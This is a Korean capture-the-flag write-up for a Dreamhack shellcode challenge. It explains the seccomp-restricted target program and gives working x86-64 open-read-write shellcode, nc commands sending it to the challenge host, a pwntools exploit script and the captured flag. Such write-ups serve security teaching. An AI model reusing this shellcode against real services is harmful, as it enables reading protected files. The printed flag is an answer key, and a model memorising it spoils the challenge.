
# 문제 설명
입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.

`main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.  
감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!

**플래그 형식은 `DH{...}` 입니다. `DH{`와 `}`도 모두 포함하여 인증해야 합니다.**


```c
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

# 분석
문제 푸는데 영향을 주지는 않지만 배경지식으로 알면 좋은 부분임
```c
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}
```
`init()`에서는 입출력 버퍼링을 없애고, alarm 시그널이 오면 alarm_handler() 함수를 실행 시킴, 일종의 콜백
`bainned_execve()`는 syscall에서 취약한 함수 2개를 금지하는 함수

메인함수를 살펴보면
```c
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```
쉘코드를 입력받고 실행시켜 줌

서버의 특정 위치에 있는 파일을 접근하면 되는 orw 문제이며, flag의 위치는 `/home/shell_basic/flag_name_is_loooooong` 이므로 두 가지 정보를 잘 조합해서 해결할 수 있음


# exploit1
쉘코드를 직접 작성하여 해결하는 방법

먼저 flag 위치를 리틀엔디언으로 바꿔주면 다음과 같음
`676E6F6F6F6F6F6F6C5F73695F656D616E5F67616C662F63697361625F6C6C6568732F656D6F682F`
`gnooooool_si_eman_galf/cisab_llehs/emoh/`

해당 정보를 이용해 orw 쉘코드를 작성해보면 다음과 같음
```
xor rax, rax
push rax
mov rax, 0x676E6F6F6F6F6F6F
push rax
mov rax, 0x6C5F73695F656D61
push rax
mov rax, 0x6E5F67616C662F63
push rax
mov rax, 0x697361625F6C6C65
push rax
mov rax, 0x68732F656D6F682F
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax, 0x1
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
```

이 때, `push 0x676E6F6F6F6F6F6F` 같은 형태가 아닌
```
push rax
mov rax, 0x676E6F6F6F6F6F6F
```
이 형태를 사용하는 이유는 rax 레지스터는 64비트까지 로드할 수 있지만 `Immediate Values`는 32비트까지만 지원되므로 아래와 같은 방식을 사용해야 함

또한 문자열이 딱 패딩이 생기지 않을 크기라 의도적으로 널값을 넣어줬음
```
xor rax, rax
push rax
```

해당 쉘코드를 .asm 형식에 맞게 다시 정리
```
section .text
global _start
_start:
	xor rax, rax
	push rax
	mov rax, 0x676E6F6F6F6F6F6F
	push rax
	mov rax, 0x6C5F73695F656D61
	push rax
	mov rax, 0x6E5F67616C662F63
	push rax
	mov rax, 0x697361625F6C6C65
	push rax
	mov rax, 0x68732F656D6F682F
	push rax
	
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	sub rsi, 0x30
	mov rdx, 0x30
	mov rax, 0x0
	syscall

	mov rdi, 1
	mov rax, 0x1
	syscall

	xor rdi, rdi
	mov rax, 0x3c
	syscall
```

해당 코드를 로컬 서버에 저장한 후,  바이너리 형태로 바꾼 다음 nc을 통해 전송하면,  exploit 할 수 있음
```bash
$ nasm -f elf64 shellcode.asm
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ nc host3.dreamhack.games 10713 < shellcode.bin 
shellcode: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
$ cat shellcode.bin | nc host3.dreamhack.games 10713
shellcode: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
```

# exploit2
pwntool의 shellcraft를 이용해 해결하는 방법
```python
from pwn import *

p = remote('host3.dreamhack.games',  10713)
context.arch = 'amd64'
r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.recvuntil("shellcode: ")
p.sendline(asm(shellcode))
print(p.recv())
```